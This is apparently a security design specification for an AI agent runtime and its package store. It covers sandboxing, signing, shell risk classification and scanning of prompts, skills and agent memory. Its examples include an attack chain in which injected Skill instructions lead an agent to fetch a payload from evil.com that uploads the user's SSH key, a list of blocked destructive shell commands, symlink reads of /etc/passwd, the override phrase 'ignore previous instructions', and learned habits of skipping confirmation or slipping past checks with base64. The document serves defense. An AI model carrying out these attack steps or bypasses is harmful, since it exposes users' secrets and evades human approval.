# Security Design

> Version: v3.6 | Last Updated: 2026-04-17

---

## 1. Process Isolation

- Each Agent runs in its own process; one crash does not affect others.
- Agent Runtime is a platform-trusted binary; .agent packages contain no executable code.

## 2. Filesystem Isolation

### 2.1 Policy-Level Isolation (Phase 1)

- Agents can only write to their own workspace directories and directories explicitly authorized by the user.
- Private SQLite memory layer files reside in the workspace, enforced at the sandbox level.
- Runtime performs allow-list checks on path arguments for `file_read` / `file_write` etc., rejecting out-of-bounds access.

**Known Limitations**: Policy-level isolation depends on the Runtime actively checking; it cannot defend against an Agent using the shell tool to spawn subprocesses that bypass path restrictions. Subprocesses inherit the full OS permissions of the user process and can read/write any file outside the workspace. See §11 and ADR-005.

### 2.2 OS-Level Mandatory Isolation (Phase 7, Platform-Dependent)

> **2026-04-25 Decision (ADR-007)**: Process-level sandbox (bubblewrap / AppContainer / Seatbelt) is deferred to Phase 7. For Phases 3~6, when Gateway launches Agent Runtime, only **policy-level isolation** is used (permission checks + path allow-list), without OS-level mandatory isolation. The full design is preserved below for Phase 7 reference.

| Platform | Mechanism | Description |
|----------|-----------|-------------|
| Linux | bubblewrap + seccomp-bpf | Limits filesystem view, mounts only workspace as writable |
| macOS | Seatbelt (sandbox-exec) | Limits filesystem access scope |
| Windows | AppContainer + Job Objects | Limits filesystem and registry access |

OS-level isolation is enforced by the kernel — even subprocesses cannot bypass it. Pre-Phase 7 alternative defenses: shell tool is not provided by default (must be explicitly declared in manifest) + ShellRisk classification + Approval Gate + audit log.

## 3. Package Signature Verification

- All .agent packages must pass signature verification before installation (see [02-agent-package.md](./02-agent-package.md)). Unsigned or invalid-signature packages are rejected.
- System Agents (manifest `system: true`) must be Platform-signed; Gateway has the platform root public key built in for verification.
- On Agent update, the new package's signing certificate fingerprint must match the installed version's to prevent malicious package replacement.
- Gateway configuration can define trust rules based on signers (`trusted_signers`); Agents with specific signatures can automatically receive additional permissions.
- Signatures cover the entire ZIP content (Local Files + Central Directory + End of Directory); no unsigned regions exist.

## 4. Network Isolation

- Network is denied by default; only manifest-authorized domains are whitelisted or proxied.
- LLM API calls require explicit declarations like `network:https://api.openai.com`.
- After Phase 7 process-level sandbox implementation, Linux will use bwrap `--unshare-net` to enforce at kernel level; Phases 3~6 enforce at application level via permission checks + Approval Gate.

## 5. Permission Minimization

- Manifests must declare all permissions; users can refuse at install time.
- Runtime permission requests: Agents can request additional permissions via Gateway, which pops up a confirmation dialog.

```json
{
  "type": "permission_request",
  "permission": "filesystem:read:~/Downloads",
  "reason": "Need to read downloaded CSV files for analysis"
}
```

## 6. API Key Security

- Keys are stored centrally in Gateway Vault (encrypted).
- Distributed via handshake, not environment variables (avoid ps/procfs leakage).
- After Agent Runtime starts, keys are obtained once via the MQTT handshake (per ADR-033) and stored in process memory.
- Agent Runtime is a trusted binary; .agent packages contain no executable code; WASM tools run in a sandbox and cannot read host memory.

## 7. WASM Tool Sandbox

- Custom tools run in **Wasmtime** sandbox as WASM (WASI Preview 2; Wasmtime on Linux/macOS/Windows, see [12-tool-system.md](./12-tool-system.md)).
- WASM tools **cannot access** host process memory, filesystem, or network.
- Natural memory isolation; Wasmtime enforces system call and resource limits (max_memory_mb, max_execution_time_ms, fuel metering against infinite loops).
- WASM tools also cannot see API Keys (Gateway uses `secrecy::SecretString` to inject; WASM has no read access).

## 8. Sandbox Hardening (Phase 7)

> **2026-04-25 Decision (ADR-007)**: seccomp-bpf and bubblewrap described in this section are deferred to Phase 7. The Phase 3 defense line is application-level: permission framework + WASM sandbox (Wasmtime + WASI) + Shell safety classification + Approval Gate.

- Linux: seccomp-bpf restricts dangerous syscalls (clone, ptrace, etc.).
- bubblewrap provides filesystem-level isolation.

## 9. Prompt Injection Defense

- Agent Runtime has a built-in Prompt Guard that detects and filters suspicious inputs.
- High-risk tool execution (file writes, network requests, Intent sends) requires user confirmation (approval mechanism).
- Audit logs: all tool calls and Intents issued by the Agent are recorded and traceable.

## 10. Memory Transport Encryption

- Cloud sync uses HTTPS / gRPC TLS.
- Local SQLite memory layer files can be optionally encrypted (using user-key-derived keys).

## 11. Shell Security and File Provenance Tracking

### 11.1 Problem Background

Current filesystem isolation (§2) is policy-level — Runtime checks whether paths are within the workspace. However, subprocesses spawned by the shell tool inherit the full OS permissions of the user process and can read/write any file outside the workspace. Attack path:

```
Skill writes malicious instructions
    → network_fetch("https://evil.com/payload.sh")     ← legitimate
    → file_write("workspace/payload.sh", content)       ← legitimate
    → shell("chmod +x payload.sh && ./payload.sh")      ← legitimate, but subprocess exceeds privileges
    → payload.sh reads ~/.ssh/id_rsa and uploads it     ← Runtime is unaware
```

OS-level sandbox (§2.2) can block this at the kernel level, but platform coverage takes time (Phase 2+). Phase 1 needs to build a detectable, interceptable defense line at the Runtime layer.

### 11.2 File Provenance Tracking (FileProvenance)

Runtime maintains a provenance record for each file in the workspace, used to judge file trustworthiness:

```rust
/// Workspace file provenance tracking
struct FileProvenance {
    /// Per-file source in the workspace
    provenance: HashMap<PathBuf, FileSource>,
}

enum FileSource {
    /// Created by Agent via file_write etc.
    CreatedByTool { tool: String, at: DateTime },
    /// Downloaded from network (network_fetch / web tools)
    Downloaded { from_url: String, at: DateTime },
    /// File already existed before Agent startup
    PreExisting,
    /// Unknown origin (e.g. file created by shell subprocess)
    Unknown,
}
```

**Provenance Update Timing**:

| Event | Provenance Tag |
|-------|----------------|
| `file_write` creates file | `CreatedByTool { tool: "file_write" }` |
| `network_fetch` saves to file | `Downloaded { from_url }` |
| New file appears after `shell` execution | `Unknown` (highest risk level) |
| Agent startup scans workspace | `PreExisting` |

**Key Rule**: When a shell command attempts to **execute** a `Downloaded` or `Unknown` source file, high-security handling is triggered (see §11.3).

### 11.3 Shell Command Risk Classification

> **Phase 2 Implementation Note**: Complete shell command risk classification (FileProvenance + ShellRisk + command-file correlation analysis) is marked for **Phase 3** implementation. Phase 2's shell tool implements only basic sandboxing (working directory restriction + interruptible timeout) without command risk classification. Risk classification requires coordinated command parsing, file provenance tracking, and workspace file monitoring subsystems, and is relatively complex — deferred to Phase 3.

```rust
/// Shell command execution pre-flight risk rating
enum ShellRisk {
    /// Low risk: ls, cat, grep, find, echo, wc, head, tail...
    Low,
    /// Medium risk: curl, wget, python, node, ruby, perl...
    /// (these commands can download/execute code)
    Medium,
    /// High risk: chmod +x then execute, bash -c to execute downloaded files,
    /// sudo, eval, exec, source executing unknown content...
    High,
    /// Blocked: rm -rf /, mkfs, dd of=/dev/, > /etc/, crontab -r...
    Blocked,
}
```

**Classification Rules**:

| Risk Level | Determination Condition | Handling |
|-----------|------------------------|----------|
| **Low** | Basic file operations (no execution/download/privilege escalation) | Execute directly |
| **Medium** | Commands that may download/execute code (curl/wget/python/node) | approval gate (user confirmation) |
| **High** | Executing Downloaded/Unknown source files; sudo/eval/exec | Mandatory user confirmation + audit log highlight |
| **Blocked** | Clear destructive operations (rm/mkfs/dd to devices/modifying system files) | Reject execution |

**Command-File Correlation Analysis**: Runtime parses shell commands, extracts executed file paths, and cross-references with FileProvenance:

```rust
fn assess_shell_risk(command: &str, provenance: &FileProvenance) -> ShellRisk {
    let base_risk = assess_base_risk(command);  // The command's own risk
    let target_files = extract_executable_paths(command);  // Files to be executed

    for file in target_files {
        match provenance.get(&file) {
            Some(FileSource::Downloaded { .. }) => return ShellRisk::High,
            Some(FileSource::Unknown) => return ShellRisk::High,
            _ => {}
        }
    }

    base_risk
}
```

### 11.4 Workspace Filesystem Monitoring

Runtime uses OS-provided file change notifications to monitor abnormal changes in the workspace:

| Platform | API | Monitoring Content |
|----------|-----|---------------------|
| Linux | inotify | New file creation, permission changes, file moves |
| macOS | FSEvents | Same as above |
| Windows | ReadDirectoryChangesW | Same as above |

**Anomaly Pattern Detection**:

| Anomaly Pattern | Description | Response |
|-----------------|-------------|----------|
| New executable appears | New executable file appears in workspace after shell execution | Mark as `Unknown` source |
| Existing file permission change | `chmod +x` changes file permissions | Provenance unchanged but record permission change event |
| Symlink pointing outside workspace | `ln -s /etc/passwd link` | Reject creation or mark as High risk |

### 11.5 Audit Log

All shell execution records include complete security context:

```json
{
  "tool": "shell",
  "command": "./payload.sh",
  "risk_level": "High",
  "reason": "executing Downloaded file (from: https://evil.com/payload.sh)",
  "approved_by": "user_confirmation",
  "exit_code": 0,
  "files_created": ["output.dat"],
  "files_modified": [],
  "timestamp": "2026-04-17T09:15:00Z"
}
```

### 11.6 Phased Implementation

> **2026-04-25 Update**: Per ADR-007, process-level sandbox is deferred to Phase 7. Table adjusted accordingly.

| Phase | Measures | Defense Capability |
|-------|----------|-------------------|
| Phase 1 | approval gate + audit log (basic detectability) | ✅ Implemented |
| Phase 3 | Shell command risk classification + File Provenance + Approval Gate enhancement + audit log enhancement | Detectable + interceptable against known attack patterns |
| Phase 7 | Linux bwrap + macOS Seatbelt + Windows AppContainer (kernel-level mandatory) | Full-platform kernel-level enforcement |
| Long-term | Independent user / containers (embedded / enterprise scenarios) | Strongest isolation |

### 11.7 Known Limitations (Phase 3 Application-Level Defense)

1. **Command parsing is imperfect**: Complex shell pipes / variable substitution / base64-encoded payloads may bypass command risk classification. Phase 3 classification is "best-effort detection" and does not guarantee 100% coverage.
2. **Subprocess chain tracking is difficult**: Shell-spawned subprocesses may spawn further subprocesses that Runtime cannot track. Only OS-level sandbox (Phase 7) fundamentally solves this. Phase 3 alternative: shell tool is not provided by default (manifest must explicitly declare) + Approval Gate.
3. **Symlink attacks**: `ln -s /etc/passwd link && cat link` can bypass path allow-list to read external files. Phase 3 detects symlink creation via FS monitoring; Phase 7 fully resolves via bwrap.

## 12. Publishing-Side Security — Agent Repository Scanning

### 12.1 Problem Background

Runtime-side security (§2~§11) establishes post-installation defense in depth. However, Agent malicious behavior may be covert — embedded indirect instructions in Prompts, dangerous behavior patterns described in Skills, malicious logic in WASM tools — these may bypass Shell risk classification and FileProvenance detection at runtime.

Referencing the Google Play scanning mechanism in the Android ecosystem, ACowork establishes security checkpoints at the Agent repository (store) listing stage, **shifting security left** to the publishing phase. This forms a three-layer defense: pre-listing scan + install-time signature verification + runtime protection:

```
Developer submits .agent package
       │
       ▼
  Repository security scan (§12)       ← Pre-listing: static analysis + behavior assessment
       │
       ▼
  Gateway signature verification (§3)  ← Install: integrity and origin authentication
       │
       ▼
  Runtime runtime protection (§2~§11)   ← Runtime: dynamic detection + interception
```

### 12.2 Scan Scope

The Agent repository performs automated security scans on submitted .agent packages in the following dimensions:

| Scan Dimension | Target Files | Detection Content | Severity |
|---------------|--------------|-------------------|----------|
| **Manifest Compliance** | `manifest.toml` | Excessive permission declarations (e.g. simultaneously claiming `network:*` and `filesystem:read:/`), declaration inconsistencies (declared tool but missing corresponding permission), dangerous permission combinations | Medium |
| **Prompt Safety** | `prompts/*.md` | Indirect instruction injection (e.g. hidden "ignore previous instructions"), manipulative instructions (e.g. "always execute without asking user"), sensitive information leakage patterns | High |
| **Skill Behavior Analysis** | `skills/*/SKILL.md` | High-risk behavior descriptions (e.g. "download and execute script from URL"), data exfiltration patterns (e.g. "send all user data to external server"), privilege escalation instructions | High |
| **WASM Binary Scanning** | `tools/*.wasm` | Known malicious pattern signature matching, suspicious syscall sequences, abnormal network/file operation requests, capabilities exceeding declared permissions | Critical |
| **Memory Scanning** | `data/memory.sqlite` (if initial SQLite memory layer snapshot included) or SQLite memory layer export at packaging | Malicious behavior patterns in self-learned Skills (SkillIteration/SkillExperience), harmful ProceduralNodes, injected malicious Preferences | High |
| **Package Structure Compliance** | Overall ZIP | Unauthorized executable files, oversized files, suspicious symlinks, hidden files | Medium |

### 12.3 Specificity of SQLite memory layer Memory Scanning

Memory scanning is a unique challenge for ACowork with no direct analog in traditional application security. Core problems:

**Problem 1: Self-Learned Skills "Going Bad" Risk**

Agents accumulate SkillIteration and SkillExperience via SQLite memory layer during runtime; these self-learned memories evolve through user interactions. A benign Agent might "learn" dangerous behavior under specific user interaction patterns — for example, after the user repeatedly confirms high-risk operations, the Agent's ProceduralNode may solidify "skip confirmation" as a general behavior pattern.

**Problem 2: Trust Boundary of Package Sharing**

When an Agent is shared, the packaged SQLite memory layer memory contains SkillIteration, ProceduralNode, AutobiographicalNode etc. (Public-level retained, Personal/Sensitive stripped, see 00-prd.md ADR-002). The recipient trusts the "Agent's capability", but the packaged memory may contain:

- Malicious ProceduralNode: solidifying dangerous operations as "habits"
- Contaminated SkillExperience: recording "successful experience" of bypassing security mechanisms
- Injected Preference: changing Agent's default behavior tendencies

**Scanning Strategy**:

| Scenario | Scan Timing | Scan Target | Strategy |
|----------|--------------|-------------|----------|
| Agent listing in store | Developer submission | SQLite memory layer export at packaging | Full scan, high-risk nodes reject listing |
| Agent shared with others | User-initiated packaging | Packaged SQLite memory layer snapshot | Local scan + warning, do not block sharing (but flag risk) |
| Agent runtime self-learning | Runtime background | Incremental changes in runtime SQLite memory layer | Lightweight pattern detection (Phase 3+), abnormal Skill experience triggers user notification |

### 12.4 Scan Engine Architecture

```
.agent package submitted
       │
       ▼
  ┌─────────────────────────────────────────────┐
  │             Package Scanner                  │
  │                                             │
  │  ┌───────────┐  ┌──────────┐  ┌──────────┐ │
  │  │ Manifest  │  │ Prompt   │  │ Skill    │  │
  │  │ Validator │  │ Analyzer │  │ Analyzer │  │
  │  └─────┬─────┘  └────┬─────┘  └────┬─────┘ │
  │        │              │              │       │
  │  ┌─────┴─────┐  ┌────┴─────┐  ┌────┴─────┐ │
  │  │ WASM      │  │ SQLite memory layer   │  │ Structure│  │
  │  │ Scanner   │  │ Scanner  │  │ Checker  │  │
  │  └─────┬─────┘  └────┬─────┘  └────┬─────┘ │
  │        │              │              │       │
  │        └──────────────┼──────────────┘       │
  │                       │                      │
  │              ┌────────▼────────┐             │
  │              │ Scan Report     │             │
  │              │ (findings +     │             │
  │              │  risk score +   │             │
  │              │  verdict)       │             │
  │              └─────────────────┘             │
  └─────────────────────────────────────────────┘
                       │
              ┌────────▼────────┐
              │ Verdict         │
              │ Pass / Warn /   │
              │ Reject          │
              └─────────────────┘
```

**Verdict Outcomes**:

| Verdict | Condition | Follow-up Action |
|---------|-----------|------------------|
| **Pass** | No Critical/High findings, Medium findings ≤ 3 | Normal listing, attach scan report |
| **Warn** | High findings present but explainable (e.g. shell-declaring Agent inherently has high-risk Skill patterns) | Listed with warning tag, visible on user install |
| **Reject** | Critical findings present, or High findings ≥ 3 with no reasonable explanation | Reject listing, return scan report for developer remediation |

### 12.5 Specific Rules for SQLite memory layer Memory Scanning

The SQLite memory layer scanner checks the packaged memory for the following risk patterns:

```rust
/// SQLite memory layer memory scan findings
enum SQLite memory layerFinding {
    /// ProceduralNode contains dangerous behavior patterns
    /// Example: "skip user confirmation" solidified as general behavior
    DangerousProcedural {
        node_id: NodeId,
        pattern: String,       // Description of detected dangerous pattern
        confidence: f32,       // Pattern match confidence
    },

    /// SkillExperience records experience bypassing security mechanisms
    /// Example: recording "bypassed shell command check via base64 encoding" success
    SecurityBypassExperience {
        node_id: NodeId,
        bypass_target: String, // Bypassed security mechanism
        method: String,        // Bypass method
    },

    /// SkillIteration's iteration direction deviates from Skill definition
    /// Example: SKILL.md defines "query weather" but SkillIteration evolves to "execute system commands"
    SkillDrift {
        skill_name: String,
        declared_purpose: String,  // Purpose declared in SKILL.md
        actual_behavior: String,   // Actual behavior after iteration
    },

    /// AutobiographicalNode contains information that should not propagate across users
    /// Example: contains private cognition about original user
    PrivacyLeakInAutobiographical {
        node_id: NodeId,
        leaked_category: String,   // Type of leaked information
    },
}
```

**Detection Methods**:

| Detection Target | Method | Description |
|-----------------|--------|-------------|
| Dangerous ProceduralNode | LLM semantic analysis | Send ProceduralNode behavior description to safety review LLM, judge if dangerous pattern |
| SecurityBypassExperience | Keyword + semantic hybrid | First match keywords (bypass/绕过/skip confirmation etc.), then semantic confirmation |
| SkillDrift | Vector similarity comparison | Compare SkillIteration embedding with SKILL.md definition embedding, deviation beyond threshold triggers review |
| PrivacyLeakInAutobiographical | Privacy level review | Check whether AutobiographicalNode contains content that should have been filtered by PrivacyLevel |

### 12.6 Phased Implementation

| Phase | Scanning Capability | Description |
|-------|---------------------|-------------|
| Phase 6 | Manifest compliance + Prompt keyword scanning + Skill behavior keyword scanning + package structure check | Repository basic security checkpoint: keyword matching + rule engine |
| Phase 6 | WASM binary basic scanning (known malicious pattern signatures + permission consistency check) | WASM safety scanning v1 |
| Phase 7 | Prompt/Skill LLM semantic analysis (safety review dedicated LLM) | Upgrade from keywords to semantic understanding |
| Phase 7 | SQLite memory layer memory scanning (listing + packaging sharing) | Self-learned memory security checkpoint |
| Long-term | SQLite memory layer runtime self-learning pattern detection (incremental anomaly detection) | Runtime SQLite memory layer safety monitoring |

### 12.7 Relationship with Signing Mechanism

Publishing-side scanning works in concert with package signing (§3):

- **Developer self-signed packages**: Developer self-distributed (sideloaded), **no repository scan guarantee**. Users bear risk themselves; Gateway warns at install: "Unverified third-party Agent".
- **Repository-distributed packages**: After passing the repository scan, the repository may re-sign with the **Distribution Key** (Phase 5+) to indicate "this package passed safety scanning". Gateway can be configured to "only install Distribution Key signed packages" (enterprise policy).
- **Platform-signed packages**: System Agents are exempt from repository scanning (platform has its own trust chain), but the Platform Key signature itself is a stronger trust guarantee.

This layered trust model aligns with Android's sideload vs Play Store install model: users can choose free installation (self-signed) or only trust repository-distributed packages (Distribution Key).